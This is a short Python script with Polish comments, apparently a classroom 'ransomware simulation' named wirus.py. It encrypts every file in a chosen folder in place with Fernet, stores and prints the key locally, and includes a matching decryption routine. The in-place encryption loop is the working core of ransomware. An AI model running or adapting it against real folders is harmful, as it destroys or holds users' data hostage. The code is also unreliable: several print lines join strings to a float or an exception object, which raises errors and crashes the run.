import os  
from cryptography.fernet import Fernet  
import time  

def wybierz_folder():
    # Wybranie folderu do przeprowadzenia symulacji

    folder_path = input("Podaj ścieżkę do folderu: ")  
    if os.path.isdir(folder_path):
        print("Wybrano folder: " + folder_path)
        return folder_path
    else:
        print("Zły folder")
        return None

def wczytaj_pliki(folder_path):
    # Funkcja liczy pliki w folderze i pomija plik wirus.py i klucz

    files = []   
    for file in os.listdir(folder_path):  
        if file in ["wirus.py", "klucz.key"]:  
            continue
        file_path = os.path.join(folder_path, file)
        if os.path.isfile(file_path):
            files.append(file)
    return files

def szyforwanie(folder_path):
    # Szyfruje pliki w folderze poza kluczem oraz plikiem wirusa
    # Generuje nowy klucz do pliku
    
    if folder_path is None: 
        return None
    
    key_file = "klucz.key" 
    key_path = os.path.join(folder_path, key_file)
    
    
    if not os.path.exists(key_path):
        key = Fernet.generate_key()  
        with open(key_path, "wb") as klucz:  
            klucz.write(key)  
        print("Utworzono klucz w pliku: " + key_path)
        print("Klucz szyfrujący: " + key.decode('utf-8'))  
    else:  
        with open(key_path, "rb") as klucz: 
            key = klucz.read() 
        print("Wczytano klucz z pliku: " + key_path)
        print("Klucz szyfrujący to: " + key.decode('utf-8'))  
    
    # Szyfrowanie plików
    start = time.time() 
    files = wczytaj_pliki(folder_path)  
    fernet = Fernet(key) 
    
    # Pętla przechodzi przez kolejne pliki w podanym folderze
    for file in files: 
        file_path = os.path.join(folder_path, file)  
        try:
            with open(file_path, "rb") as pliczki:  
                contents = pliczki.read()  # Wczytaj pliki
            contents_encrypted = fernet.encrypt(contents)  # Szyfruje zawartośc
            with open(file_path, "wb") as pliczki: 
                pliczki.write(contents_encrypted)  # Zastępuje zawartość pliku zaszyfrowanymi
            print("Zaszyfrowano plik: " + file) 
        except Exception as e:
            print("Błąd podczas szyfrowania pliku: " + file + " błąd: " + e) 
    
    czas = time.time() - start  
    print("Symulacja wykonałą się w: " + czas + "s") 
    return key 

def odszyforwanie(folder_path, key):
    # Odszyfrowuje pliki
    # Podobnie jak szyforwanie tylko w drugą strone

    start = time.time() 
    files = wczytaj_pliki(folder_path)  
    fernet = Fernet(key) 
    
    for file in files:
        file_path = os.path.join(folder_path, file)
        try:
            with open(file_path, "rb") as pliczki: 
                contents = pliczki.read()  # Wczytaj zaszyfrowaną zawartość
            contents_decrypted = fernet.decrypt(contents)  # Odszyfruj zawartość
            with open(file_path, "wb") as pliczki:  
                pliczki.write(contents_decrypted) # Zastępuje zaszyfrowaną zawartość odszyforwanymi
            print(f"Odszyfrowano: {file}")
        except Exception as e:
            print("Błąd podczas odszyfrowywania"+ file + " błąd "+ e)  # Obsłuż błędy, np. uszkodzony klucz
    
    czas = time.time() - start  # Oblicz czas wykonania
    print("Gotowe. Odszyfrowano pliki w: " + czas + "sekund") 
